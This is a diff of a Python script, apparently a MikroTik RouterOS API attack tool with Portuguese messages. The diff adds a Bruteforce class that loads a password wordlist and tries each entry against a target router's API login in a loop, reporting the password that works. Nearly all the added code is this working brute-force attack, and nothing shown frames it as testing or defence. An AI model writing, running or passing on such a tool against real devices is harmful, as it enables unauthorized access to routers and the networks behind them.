@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+# Version: 1.1
 
 #Check for Python3
 import sys
@@ -8,8 +9,18 @@ if sys.version_info < (3, 0):
     sys.exit(2)
 
 import binascii, getopt, hashlib, select, socket, time, signal, codecs, ssl
-import json, os
+import json, os, argparse
 from _log import Log
+
+try:
+    from rosapi import Api
+except ModuleNotFoundError:
+    raise ImportError("[ERRO] Módulo 'rosapi' não encontrado. Certifique-se de que 'laiarturs-ros-api' está instalado corretamente com: pip install laiarturs-ros-api")
+
+try:
+    from _log import Log
+except ModuleNotFoundError:
+    raise ImportError("[ERRO] Módulo '_log' não encontrado. Verifique se o arquivo _log.py está presente no mesmo diretório da ferramenta.")
 
 # Constants - Define defaults
 USE_SSL = False
@@ -37,6 +48,60 @@ class CreateSocketError(Exception):
 
 class RouterOSTrapError(Exception):
     pass
+
+class Bruteforce:
+    def __init__(self, target, port, user, wordlist_path, delay, autosave_path=None, use_ssl=False):
+        self.target = target
+        self.port = port
+        self.user = user
+        self.delay = delay
+        self.wordlist_path = wordlist_path
+        self.autosave_path = autosave_path
+        self.use_ssl = use_ssl
+        self.log = Log(stdout=True)
+        self.api = None
+        self.load_wordlist()
+
+    def load_wordlist(self):
+        try:
+            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
+                self.wordlist = [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            self.log.error(f"Erro ao carregar dicionário: {e}")
+            exit(1)
+
+    def try_connect(self):
+        try:
+            self.api = Api(self.target, self.port, use_ssl=self.use_ssl)
+            return True
+        except ssl.SSLError as e:
+            self.log.error(f"Erro SSL ao conectar: {e}")
+        except ConnectionRefusedError:
+            self.log.error(f"Conexão recusada ao tentar conectar em {self.target}:{self.port}")
+        except socket.timeout:
+            self.log.error("Timeout de conexão com o host")
+        except Exception as e:
+            self.log.error(f"Erro inesperado ao conectar: {e}")
+        return False
+
+    def run(self):
+        self.log.info("[*] Iniciando ataque de força bruta...")
+        if not self.try_connect():
+            return
+
+        for index, password in enumerate(self.wordlist):
+            try:
+                if self.api.login(self.user, password):
+                    self.log.success(f"[+] Sucesso! Usuário: {self.user} Senha: {password}")
+                    break
+                else:
+                    self.log.info(f"[-] Tentativa {index+1}/{len(self.wordlist)} - Senha incorreta: {password}")
+            except Exception as e:
+                self.log.warning(f"Erro ao tentar autenticar com a senha '{password}': {e}")
+
+            time.sleep(self.delay)
+
+        self.log.info("[*] Ataque finalizado.")
 
 
 banner=('''
